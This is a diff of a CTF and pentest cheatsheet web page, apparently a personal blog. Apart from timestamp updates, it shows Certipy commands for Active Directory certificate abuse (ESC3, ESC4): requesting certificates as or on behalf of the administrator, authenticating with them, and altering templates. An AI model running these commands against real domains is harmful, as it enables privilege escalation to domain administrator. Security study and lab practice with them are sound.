@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&id=35840b9b-8958-455b-83ed-312be6e09422&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2">
 <meta property="article:published_time" content="2024-06-26T15:42:13.000Z">
-<meta property="article:modified_time" content="2025-02-18T19:35:27.912Z">
+<meta property="article:modified_time" content="2025-04-07T22:47:04.445Z">
 <meta property="article:author" content="serioton">
 <meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
 <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-02-18 19:35:27'
+  postUpdate: '2025-04-07 22:47:04'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -190,7 +190,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -domain domain -u username -dc-ip ip</span><br></pre></td></tr></table></figure>
 <h2 id="ESC3"><a href="#ESC3" class="headerlink" title="ESC3"></a>ESC3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req username -p password -ca ca -target domain -template User -on-behalf-of &#x27;domain\administrator&#x27; -pfx pfx_file</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req username -p password -ca ca -target domain -template User -on-behalf-of administrator -pfx pfx_file</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
 <h2 id="ESC4"><a href="#ESC4" class="headerlink" title="ESC4"></a>ESC4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u username -p password -template template -save-old -dc-ip ip</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator</span><br></pre></td></tr></table></figure>
